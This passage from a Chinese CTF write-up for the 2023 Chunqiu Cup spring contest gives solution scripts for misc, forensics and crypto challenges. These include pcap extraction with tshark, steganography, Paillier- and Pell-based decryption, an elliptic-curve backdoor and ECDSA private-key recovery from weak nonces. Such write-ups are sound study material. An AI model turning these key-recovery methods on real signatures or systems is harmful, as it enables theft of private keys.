class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            string = base64.b64decode(output)</span><br><span class="line">            output = string.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(output)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">decrypt_files(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line"><span class="comment">#flag&#123;640ce012-3d3a-446d-9d0e-5d2fe840063b&#125;</span></span><br></pre></td></tr></table></figure>
<h3 id="盲人隐藏了起来"><a class="markdownIt-Anchor" href="#盲人隐藏了起来"></a> 盲人隐藏了起来</h3>
<p>对比34文件修补12文件头</p>
<p><img src="/2023/05/2023%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%98%A5%E5%AD%A3%E8%B5%9B-Writeup/image-20230519200245901.png" alt="image-20230519200245901"></p>
<p>另存为12.mp4打开播放，获得压缩包密码<code>ChunJiSai7k7kbibi@!</code></p>
<p><img src="/2023/05/2023%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%98%A5%E5%AD%A3%E8%B5%9B-Writeup/image-20230519200333495.png" alt="image-20230519200333495"></p>
<p>获得一个flag.png</p>
<p>stegsolve打开分析，BGR获取到flag</p>
<p><img src="/2023/05/2023%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%98%A5%E5%AD%A3%E8%B5%9B-Writeup/image-20230519201039450.png" alt="image-20230519201039450"></p>
<h3 id="happy2forensics"><a class="markdownIt-Anchor" href="#happy2forensics"></a> happy2forensics</h3>
<p>Wireshark导出http发现有一个rar，提取出来，发现是个磁盘，根据提示20-&gt;80会得到密码</p>
<p>导出一下</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tshark -r happy2forensics.pcapng -Y &quot;tcp.srcport==20 &amp;&amp; tcp.dstport==80&quot; -Tfields-e tcp.seq_raw</span><br></pre></td></tr></table></figure>
<p>bytes一下得到密码</p>
<p><code>bitlocker:120483-350966-299189-055297-225478-133463-431684-359403</code></p>
<p>用dis恢复一下，发现有一个压缩包，但是需要密码，图片中有一个不正常5m。放入010进行分析</p>
<p>发现有很多png，还有两个jpg的文件尾，手动补全一个jpg得到flag1，foremost分离得到一堆png</p>
<p>拼接得到压缩包密码</p>
<p><img src="/2023/05/2023%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%98%A5%E5%AD%A3%E8%B5%9B-Writeup/combined.png" alt="combined"></p>
<p>解开压缩包，得到flag</p>
<h2 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> Crypto</h2>
<h3 id="cheakin"><a class="markdownIt-Anchor" href="#cheakin"></a> cheakin</h3>
<p><img src="/2023/05/2023%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%98%A5%E5%AD%A3%E8%B5%9B-Writeup/168449482293940.png" alt="img"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> n2s</span><br><span class="line">n = <span class="number">14381700422128582509148801752355744589949207890477326887251636389639477554903212313766087310581920423926674144511237847467160303159477932732842314969782540035709454603184976310835433114879043016737665256729350745769071186849072915716081380191025215059636548339167264601163525017898164466972776553148697204889820118261937316228241099344357088387154112255824092894798716597134811437852876763391697588672779069166285303075312833415574850549277205130215394422655325352478386576833373623679069271857652029364332047485797407322257853316210866532938722911480593571175419708834718860211036796987231227104370259051299799633809</span></span><br><span class="line">c1 = <span class="number">7213976567554002619445032200800186986758840297933991288547009708561953107405266725278346810536664670987171549114913443730366439254199110599202411546254632702440251000149674899033994570393935743323319736976929843596350656674709510612789987746895513057821629144725499933366382123251520676386059405796801097683107223771674383940907066300331503757142088898427893069444164604408189686282018392714450005250018004986102062209998463347007934222341910941474212611569508001910685822097788669516018081617394144015000387497289693096617795809933540456797387940627782045397249431573540932386564021712811633992948508497879189416719996092292320828635490820907122756459412206735413770335545012892724496210585503157766011075566023635046144730429791359690237088629187946232458937292767085665897489251315749496284368726255508362410603108788759785472319449267909859926786774679533591222665476101832482161295321411313525830843915966136814748249906589458905410141906965538387896747375546846618213595165688661941876715858338407833641907024891922856719044736945863722003318526031957256722493189062624177017279248142024760515092698242159769372410662895078523142768353100643884341413944795392762315999109544070401451087596138520908569234305384182336436670714204963907240715652950621301644972412252424876159530992</span></span><br><span class="line">m1 = ((c1 - <span class="number">1</span>)//(n**<span class="number">2</span>)) * inverse_mod(<span class="number">233</span>,n)</span><br><span class="line">m1 = m1%n</span><br><span class="line"><span class="built_in">print</span>(n2s(<span class="built_in">int</span>(m1%n)))</span><br><span class="line"><span class="comment">#b&#x27;flag&#123;11e89e28-4e27-47&#x27;</span></span><br></pre></td></tr></table></figure>
<p><img src="/2023/05/2023%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%98%A5%E5%AD%A3%E8%B5%9B-Writeup/168449483893243.png" alt="img"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line">D = <span class="number">1117</span></span><br><span class="line">c = continued_fraction(sqrt(D))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10000</span>):</span><br><span class="line">    x,y = c.numerator(i),c.denominator(i)</span><br><span class="line">    <span class="keyword">if</span> x**<span class="number">2</span> - D * y**<span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">        x0,y0 = x,y</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p><img src="/2023/05/2023%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%98%A5%E5%AD%A3%E8%B5%9B-Writeup/168449485931246.png" alt="img"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">14381700422128582509148801752355744589949207890477326887251636389639477554903212313766087310581920423926674144511237847467160303159477932732842314969782540035709454603184976310835433114879043016737665256729350745769071186849072915716081380191025215059636548339167264601163525017898164466972776553148697204889820118261937316228241099344357088387154112255824092894798716597134811437852876763391697588672779069166285303075312833415574850549277205130215394422655325352478386576833373623679069271857652029364332047485797407322257853316210866532938722911480593571175419708834718860211036796987231227104370259051299799633809</span></span><br><span class="line">c1 = <span class="number">7213976567554002619445032200800186986758840297933991288547009708561953107405266725278346810536664670987171549114913443730366439254199110599202411546254632702440251000149674899033994570393935743323319736976929843596350656674709510612789987746895513057821629144725499933366382123251520676386059405796801097683107223771674383940907066300331503757142088898427893069444164604408189686282018392714450005250018004986102062209998463347007934222341910941474212611569508001910685822097788669516018081617394144015000387497289693096617795809933540456797387940627782045397249431573540932386564021712811633992948508497879189416719996092292320828635490820907122756459412206735413770335545012892724496210585503157766011075566023635046144730429791359690237088629187946232458937292767085665897489251315749496284368726255508362410603108788759785472319449267909859926786774679533591222665476101832482161295321411313525830843915966136814748249906589458905410141906965538387896747375546846618213595165688661941876715858338407833641907024891922856719044736945863722003318526031957256722493189062624177017279248142024760515092698242159769372410662895078523142768353100643884341413944795392762315999109544070401451087596138520908569234305384182336436670714204963907240715652950621301644972412252424876159530992</span></span><br><span class="line">c2 = <span class="number">15954854445966181136742750543358176358186230663706091821454832527034640100670779737656720251005109942306013877086451482243141488450122353285697850016200364912263403464109626937525725210545566742746628476797261121321515812788726862118315480354196115424526212965145342675007815411995594752584377871686965531829990461770047418586001518916553661158567047779694730702789677326905844275827365395845945286695577426050334364557405151339008293258932006267159313380746863008928500607405457044370494583863960981060999695448408234857505591647503423149271589648863473472196402149897680041851877198062464480400493467334040101779732999029043327947071232256187123316057998759518569161852646625701393295408789279678540894319137126821001853808931387200759810381958895695749251834840804088478214013923869059004663359509316215974475427057000629842098545503905230785431115754636129549758888267877395566717448365986552725726428222769339088308242580851434964429627168365161743834285778996916154182286570122208454025753108647581888781783757375011437394936853319184725324597963035778640646869326035848170752766298225095197226934969602554875402243303906613183431896300664684256018886119255870435413622515792072064528098344111446380223430819596310173312668368618931885819458529703118195242890075359424013033800260927722161030183373647798407301688760998313223874318513944409702828538509864933624724225689414495687466779277994989628367119101</span></span><br><span class="line">y = y0</span><br><span class="line">res = <span class="built_in">int</span>(((((c2 - <span class="number">1</span>) // n) // y)// n // y) * <span class="number">2</span>)</span><br><span class="line">m2 = var(<span class="string">&quot;m2&quot;</span>)</span><br><span class="line">f2 = m2 * (m2 -<span class="number">1</span>) - www</span><br><span class="line">m2 = <span class="built_in">int</span>(solve(f2,m2)[<span class="number">0</span>].right_hand_side())</span><br><span class="line"><span class="comment">#f0-a7c7-8e66c18881be&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
<p>拼起来：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">flag = n2s(<span class="built_in">int</span>(m1)) + n2s(<span class="built_in">int</span>(m2))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#b&#x27;flag&#123;11e89e28-4e27-47f0-a7c7-8e66c18881be&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
<h3 id="backdoor"><a class="markdownIt-Anchor" href="#backdoor"></a> backdoor</h3>
<p>网上能找到类似题目，照猫画虎</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.strxor <span class="keyword">import</span> strxor</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="comment"># 定义一些变量</span></span><br><span class="line">(w, a, b, x) = (<span class="number">31889563</span>, <span class="number">31153</span>, <span class="number">28517</span>, <span class="number">763220531</span>)</span><br><span class="line">(A, B, P) = (<span class="number">1064988096</span>, <span class="number">802063264240</span>, <span class="number">12565302212045582769124388577074506881895777499095598016237085270545754804754108580101112266821575105979557524040668050927829331647411956215940656838233527</span>)</span><br><span class="line">G = (<span class="number">359297413048687497387015267480858122712978942384458634636826020013871463646849523577260820163767471924019580831592309960165276513810592046624940283279131</span>, <span class="number">9290586933629395882565073588501573863992359052743649536992808088692463307334265060644810911389976524008568647496608901222631270760608733724291675910247770</span>)</span><br><span class="line">M1 = (<span class="number">10930305358553250299911486296334290816447877698513318419802777123689138630792465404548228252534960885714060411282825155604339364568677765849414624286307139</span>, <span class="number">7974701243567912294657709972665114029771010872297725947444110914737157017082782484356147938296124777392629435915168481799494053881335678760116023075462921</span>)</span><br><span class="line">M2 = (<span class="number">497353451039150377961380023736260648366248764299414896780530627602565037872686230259859191906258041016214805015473019277626331812412272940029276101709693</span>, <span class="number">8439756863534455395772111050047162924667310322829095861192323688205133726655589045018003963413676473738236408975953021037765999542116607686218566948766462</span>)</span><br><span class="line">B_ = (<span class="number">5516900502352630982628557924432908395278078868116449817099410694627060720635892997830736032175084336697081211958825053352950153336574705799801251193930256</span>, <span class="number">10314456103976125214338213393161012551632498638755274752918126246399488480437083278584365543698685202192543021224052941574332651066234126608624976216302370</span>)</span><br><span class="line"><span class="comment"># 定义椭圆曲线</span></span><br><span class="line">E = EllipticCurve(GF(P), [A, B])</span><br><span class="line">G = E(G)</span><br><span class="line">M1 = E(M1)</span><br><span class="line">M2 = E(M2)</span><br><span class="line">B_ = E(B_)</span><br><span class="line"><span class="comment"># 计算共享秘密</span></span><br><span class="line">z = M1 - w * G - a * x * M1 - x * b * G</span><br><span class="line">k2 = sha256(<span class="built_in">str</span>(z[<span class="number">0</span>]).encode()).digest()[:<span class="number">6</span>]</span><br><span class="line">k2 = bytes_to_long(k2)</span><br><span class="line">shared_key2 = k2 * B_</span><br><span class="line"><span class="comment"># 使用 MD5 生成密钥</span></span><br><span class="line">key = md5(<span class="built_in">str</span>(<span class="built_in">int</span>(shared_key2[<span class="number">0</span>])).encode()).digest()</span><br><span class="line"><span class="comment"># 解密密文，输出明文</span></span><br><span class="line">cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">ct = <span class="string">b&#x27;\x1a\xfb\xa2\xe1\x86\x04\xfak\x9a\xa3\xd15\xb8\x16\x1d\xbc\xa9S\xf5;\xfa\xf1\x08dn~\xd4\x94\xa4;^*\xf6\xd7\xf10\xa3\xe1k`\x1f-\xef\x80\x16\x80\x80\xe2&#x27;</span></span><br><span class="line">pt = cipher.decrypt(ct)</span><br><span class="line"><span class="built_in">print</span>(pt)</span><br></pre></td></tr></table></figure>
<h3 id="ecdsa"><a class="markdownIt-Anchor" href="#ecdsa"></a> ecdsa</h3>
<p>第一段：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> ecdsa</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.strxor <span class="keyword">import</span> strxor <span class="keyword">as</span> xor</span><br><span class="line"><span class="keyword">import</span> secret</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">256</span>)</span><br><span class="line">gen = <span class="keyword">lambda</span>: p + getPrime(<span class="number">16</span>)</span><br><span class="line">pad = <span class="keyword">lambda</span> m: m + os.urandom(<span class="number">32</span> - <span class="built_in">len</span>(m) % <span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">key = os.urandom(<span class="number">30</span>)</span><br><span class="line">sk = ecdsa.SigningKey.from_secret_exponent(</span><br><span class="line">    secexp=bytes_to_long(key),</span><br><span class="line">    curve=ecdsa.SECP256k1</span><br><span class="line">)</span><br><span class="line">sig1 = sk.sign(data=<span class="string">b&#x27;This is the first message.&#x27;</span>, k=gen()).<span class="built_in">hex</span>()</span><br><span class="line">sig2 = sk.sign(data=<span class="string">b&#x27;Here is another message.&#x27;</span>, k=gen()).<span class="built_in">hex</span>()</span><br><span class="line">enc = xor(hashlib.sha512(key).digest(), pad(secret.flag)).<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;sig1 = &#125;</span>\n<span class="subst">&#123;sig2 = &#125;</span>\n<span class="subst">&#123;enc = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">sig1 = &#x27;3f4a6f288e35a4397201d246a98c1f9cfa463e67717fbbdcbd26d7fac75f875855455c2bfb355f7f593ffbe4c4bd1fc729cc129976b56905639100c8ac716b37&#x27;</span></span><br><span class="line"><span class="string">sig2 = &#x27;9f563b21f0ee31b2f7a1a8c6edc8ff23b63e0a9d5dd4a699ecc3164871b4982df51bb2feb4bc06c578afd21d3e6227231dd5fe1d8440f3dcd025fd3ea68f5516&#x27;</span></span><br><span class="line"><span class="string">enc = &#x27;cc66d251bfa54954890c81dc1c607bae716573949f327db18aa1f4c0f420b8d29dc7e7ff9edb17b90306bd2aa753fc3fd4dafb9cc4b771cbdd79000ef05a40c0&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
<p>第二段：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> ecdsa.util <span class="keyword">import</span> sigdecode_string</span><br><span class="line"><span class="keyword">from</span> ecdsa <span class="keyword">import</span> SECP256k1</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha1,sha512</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.strxor <span class="keyword">import</span> strxor <span class="keyword">as</span> xor</span><br><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> inverse_mod</span><br><span class="line"><span class="keyword">from</span> ecdsa._compat <span class="keyword">import</span> normalise_bytes</span><br><span class="line"><span class="keyword">from</span> ecdsa.keys <span class="keyword">import</span> _truncate_and_convert_digest</span><br><span class="line">sig1 = <span class="string">&#x27;3f4a6f288e35a4397201d246a98c1f9cfa463e67717fbbdcbd26d7fac75f875855455c2bfb355f7f593ffbe4c4bd1fc729cc129976b56905639100c8ac716b37&#x27;</span></span><br><span class="line">sig2 = <span class="string">&#x27;9f563b21f0ee31b2f7a1a8c6edc8ff23b63e0a9d5dd4a699ecc3164871b4982df51bb2feb4bc06c578afd21d3e6227231dd5fe1d8440f3dcd025fd3ea68f5516&#x27;</span></span><br><span class="line">enc = <span class="string">&#x27;cc66d251bfa54954890c81dc1c607bae716573949f327db18aa1f4c0f420b8d29dc7e7ff9edb17b90306bd2aa753fc3fd4dafb9cc4b771cbdd79000ef05a40c0&#x27;</span></span><br><span class="line">enc = <span class="built_in">bytes</span>.fromhex(enc)</span><br><span class="line">r1,s1 = sigdecode_string(<span class="built_in">bytes</span>.fromhex(sig1),<span class="built_in">int</span>(SECP256k1.order))</span><br><span class="line">r2,s2 = sigdecode_string(<span class="built_in">bytes</span>.fromhex(sig2),<span class="built_in">int</span>(SECP256k1.order))</span><br><span class="line">p = <span class="built_in">int</span>(SECP256k1.curve.p())</span><br><span class="line"><span class="comment"># hashfunc使用的是sha1</span></span><br><span class="line">h1 = <span class="built_in">int</span>(sha1(<span class="string">b&#x27;This is the first message.&#x27;</span>).hexdigest(),<span class="number">16</span>)</span><br><span class="line">h2 = <span class="built_in">int</span>(sha1(<span class="string">b&#x27;Here is another message.&#x27;</span>).hexdigest(),<span class="number">16</span>)</span><br><span class="line">n = <span class="built_in">int</span>(SECP256k1.order)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> kr <span class="keyword">in</span> <span class="built_in">range</span>(-(<span class="number">1</span>&lt;&lt;<span class="number">16</span>),<span class="number">1</span>&lt;&lt;<span class="number">16</span>):</span><br><span class="line">    kr %= n</span><br><span class="line">    key = (s1*s2*kr - h1*s2 + h2*s1)*inverse_mod(r1*s2-r2*s1,n) % n</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        key = <span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(<span class="built_in">int</span>(key))[<span class="number">2</span>:].zfill(<span class="number">60</span>))</span><br><span class="line">        res = (xor(sha512(key).digest(), enc))</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27;flag&#x27;</span> <span class="keyword">in</span> res:</span><br><span class="line">            <span class="built_in">print</span>(res)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">        </span><br><span class="line"><span class="comment">#b&#x27;flag&#123;2f64731e-785b-4259-4566-3d17554bfb7b&#125;\xed\x98\x98\xbc\x92+\xc7\x7f\xe2_\xfd\x17\x1e\x9c\xf7\x17Rq\xfa3\xa2&#123;&#x27;</span></span><br></pre></td></tr></table></figure>
<h3 id="cisticola"><a class="markdownIt-Anchor" href="#cisticola"></a> Cisticola</h3>
<p>第一部分：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env sage</span></span><br><span class="line"><span class="comment"># Problem by rec, with nothing.</span></span><br><span class="line"><span class="keyword">import</span> secret</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">key = os.urandom(<span class="number">16</span>)</span><br><span class="line">cipher = AES.new(key=key, iv=<span class="built_in">bytes</span>(<span class="built_in">range</span>(<span class="number">16</span>)), mode=AES.MODE_CBC)</span><br><span class="line">enc = cipher.encrypt(pad(secret.flag, <span class="number">16</span>)).<span class="built_in">hex</span>()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;enc = &#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">p = <span class="number">1439830214451992034013504859825496348425599138552815552028441481225682951310010651304957987750558339128649248859043607574873717185051113737355019502086518775325158336557488060325293103679742942484012852921804371007968007851081933599</span></span><br><span class="line">R.&lt;x&gt; = PolynomialRing(GF(p))</span><br><span class="line">Q = R(Q)</span><br><span class="line"></span><br><span class="line">t = <span class="number">17</span></span><br><span class="line">pos = random.sample(<span class="built_in">range</span>(<span class="number">600</span>), t) + [<span class="number">600</span>]</span><br><span class="line">poly = [<span class="built_in">int</span>(os.urandom(<span class="number">16</span>).<span class="built_in">hex</span>(), <span class="number">16</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(t)] + [<span class="built_in">int</span>(key.<span class="built_in">hex</span>(), <span class="number">16</span>)]</span><br><span class="line">hint = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(t+<span class="number">1</span>):</span><br><span class="line">    hint = (hint + poly[i]*x^pos[i]) % Q</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;pos = &#125;</span>\n<span class="subst">&#123;hint = &#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>第二部分数据较大，截图展示</p>
<p><img src="/2023/05/2023%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%98%A5%E5%AD%A3%E8%B5%9B-Writeup/image-20230519192011176.png" alt="image-20230519192011176"></p>
<p>不要尝试使用sagemath原函数取计算了，只能通过python去模拟这个过程</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">t = <span class="number">17</span></span><br><span class="line">ps = PolynomialRing(Zmod(p),[var(<span class="string">&#x27;p%02d&#x27;</span>%i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(t+<span class="number">1</span>)]).gens()</span><br><span class="line"><span class="comment"># ps = [var(&#x27;p%02d&#x27;%i) for i in range(t+1)]</span></span><br><span class="line">poly = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">601</span>)]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(pos)):</span><br><span class="line">    poly[pos[i]] = ps[i]</span><br><span class="line">Q = <span class="built_in">list</span>(Q)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(Q)):</span><br><span class="line">    Q[i] = <span class="built_in">int</span>(Q[i])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">divmod</span>(<span class="params">a:<span class="built_in">list</span>[<span class="built_in">int</span>],b:<span class="built_in">list</span>[<span class="built_in">int</span>],p</span>):</span><br><span class="line">    <span class="comment"># an,bn记录多项式的长度</span></span><br><span class="line">    <span class="comment"># 默认a，b的系数都小于p</span></span><br><span class="line">    an,bn = <span class="built_in">len</span>(a)-<span class="number">1</span>,<span class="built_in">len</span>(b)-<span class="number">1</span></span><br><span class="line">    <span class="keyword">assert</span> an&gt;bn <span class="keyword">or</span> (an == bn <span class="keyword">and</span> a[an] &gt; b[bn]), <span class="string">&quot;被除数过小&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(an,bn-<span class="number">1</span>,-<span class="number">1</span>)):</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> a[i] == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        tmp = p - a[i]</span><br><span class="line">        <span class="comment"># print(tmp)</span></span><br><span class="line">        tmp_b = [b[i]*tmp <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(bn+<span class="number">1</span>)]</span><br><span class="line">        <span class="comment"># print(tmp_b)</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(bn,-<span class="number">1</span>,-<span class="number">1</span>):</span><br><span class="line">            a[i-bn+j] += tmp_b[j]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">res = <span class="built_in">divmod</span>(poly,Q,p)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(res)):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;p&#x27;</span> <span class="keyword">in</span> <span class="built_in">str</span>(res[i]):</span><br><span class="line">        <span 